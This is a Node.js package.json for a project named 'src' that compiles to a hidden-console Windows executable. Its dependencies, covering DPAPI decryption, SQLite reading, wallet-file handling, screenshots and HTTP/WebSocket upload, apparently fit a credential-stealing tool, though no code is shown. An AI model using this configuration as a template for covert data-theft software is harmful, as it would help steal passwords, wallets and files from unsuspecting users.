{
    "name": "src",
    "version": "1.0.2",
    "main": "index.js",
    "bin": "index.js",
    "scripts": {
        "start": "node index.js",
        "bunBuild": "bun build --bytecode --target=bun --production --minify --minify-syntax --windows-hide-console --compile index.js --outfile ../dist/app | cls",
        "pkgBuild": "pkg . --output ../dist/app.exe --targets node16-win-x64 --compress=GZip | cls"
    },
    "keywords": [],
    "author": "",
    "license": "MIT",
    "description": "",
    "dependencies": {
      "adm-zip": "^0.5.16",
      "axios": "^1.8.4",
      "buffer-replace": "^1.0.0",
      "fast-glob": "^3.3.2",
      "form-data": "^4.0.0",
      "node-dpapi-prebuilt": "^1.0.4",
      "node-forge": "^1.3.1",
      "screenshot-desktop": "^1.15.1",
      "seco-file": "^1.2.0",
      "sqlite3": "^5.1.7",
      "ws": "^8.18.1"
    },
    "pkg": {
      "assets": [
        "./app.tgz",
        "./app.tgz.sha256",
        "node_modules/node-dpapi-prebuilt/bin/x64/node-dpapi.node",
        "node_modules/sqlite3/build/Release/node_sqlite3.node",
        "node_modules/axios/dist/node/**/*",
        "./node_modules/fast-glob/**/*"
      ],
      "ignore": [
        "./node_modules/string-width/**/*",
        "./node_modules/strip-ansi/**/*",
        "./node_modules/wrap-ansi/**/*",
        "./node_modules/ansi-regex/**/*",
        "./node_modules/ansi-styles/**/*",
        "**/*.test.js",
        "**/*.spec.js",
        "**/__tests__/**",
        "**/test/**",
        "**/coverage/**",
        "config.dev.js",
        "config.local.json",
        ".env.development",
        "tmp/**",
        "logs/**",
        "*.log",
        "npm-debug.log",
        "docs/**",
        "examples/**",
        "README.*",
        "CHANGELOG.*",
        ".DS_Store",
        "Thumbs.db",
        ".vscode/**",
        ".idea/**",
        "*.bak",
        "*.swp"
      ]
    }
  }
  